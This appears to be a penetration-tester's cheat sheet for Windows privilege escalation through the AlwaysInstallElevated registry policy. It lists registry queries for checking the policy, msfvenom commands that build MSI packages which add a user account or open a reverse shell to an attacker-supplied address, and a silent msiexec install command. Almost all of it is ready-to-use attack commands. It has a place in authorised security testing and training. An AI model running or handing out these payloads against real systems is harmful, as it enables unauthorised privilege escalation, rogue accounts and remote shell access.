# Always install elevated

## Enumeration

Both keys have to exist and be set to one

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Exploitation

### msfvenom payload

```
msfvenom -p windows/adduser USER=<user> PASS=<pass> -f msi -o <filename>.msi
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <filename>.msi
msfvenom -p windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <filename>.msi
---staged---
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <filename>.msi
msfvenom -p windows/powershell/reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <filename>.msi
```

### Install MSI

```
msiexec /quiet /qn /i <path to file>.msi
```

